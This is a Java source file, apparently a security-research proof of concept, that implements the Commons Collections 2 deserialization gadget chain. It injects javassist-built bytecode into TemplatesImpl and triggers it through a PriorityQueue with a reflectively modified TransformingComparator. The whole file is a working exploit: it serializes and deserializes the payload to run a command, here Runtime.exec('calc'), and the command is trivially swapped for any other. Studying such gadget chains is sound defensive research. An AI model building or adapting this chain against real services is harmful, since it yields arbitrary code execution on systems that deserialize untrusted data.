package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class CommonsCollections2 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        SerializeUtils.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        SerializeUtils.setFieldValue(templatesImpl, "_name", "boogipop");
        SerializeUtils.setFieldValue(templatesImpl, "_tfactory", null);
        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);
        priorityQueue.add(templatesImpl);
        priorityQueue.add(2);
        Class tc=transformingComparator.getClass();
        Field comparator = tc.getDeclaredField("transformer");
        comparator.setAccessible(true);
        comparator.set(transformingComparator,invokerTransformer);
        String s = SerializeUtils.base64serial(priorityQueue);
        SerializeUtils.base64deserial(s);
    }
}
